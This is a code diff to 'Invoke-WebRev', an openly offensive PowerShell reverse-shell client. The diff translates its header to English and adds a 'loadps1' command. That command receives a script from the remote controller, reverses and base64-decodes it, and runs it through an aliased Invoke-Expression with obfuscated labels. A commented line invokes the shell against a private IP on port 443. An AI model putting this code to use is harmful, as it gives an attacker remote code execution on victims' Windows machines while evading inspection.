@@ -13,8 +13,8 @@ function Invoke-WebRev{
     PowerShell Function: Invoke-WebRev
     Author: Hector de Armas (3v4Si0N)
 
-    Dependencias Requeridas: Ninguna
-    Dependencias Opcionales: Ninguna
+    Required Dependencies: Powershell >= v3.0
+    Optional Dependencies: None
 .DESCRIPTION
     .
 
@@ -129,6 +129,25 @@ function Invoke-WebRev{
                 }
                 catch {}
             }
+            elseif($cstr.split(" ")[0] -eq "loadps1")
+            {
+                $type = '"type":"L04DPS1"';
+                try
+                {
+                    $loadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
+                    $loadData = $loadData.ToCharArray();
+                    [array]::Reverse($loadData);
+                    $loadData = -join($loadData);
+                    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($loadData));
+                    taleska-ei-vrixeka $content | Out-String;
+                    $result = '[+] File loaded sucessfully.'
+                }
+                catch
+                {
+                    $type = '"type":"3RR0R"';
+                    $result = '[!] Error loading PS1!';
+                }
+            }
             else
             {
                 $type = '"type":"C0MM4ND"';                
@@ -215,4 +234,4 @@ function PatchMe
     taleska-ei-vrixeka $data;
 }
 
-#Invoke-WebRev -ip 192.168.224.128 -port 443 -ssl
+#Invoke-WebRev -ip 192.168.224.136 -port 443 -ssl;
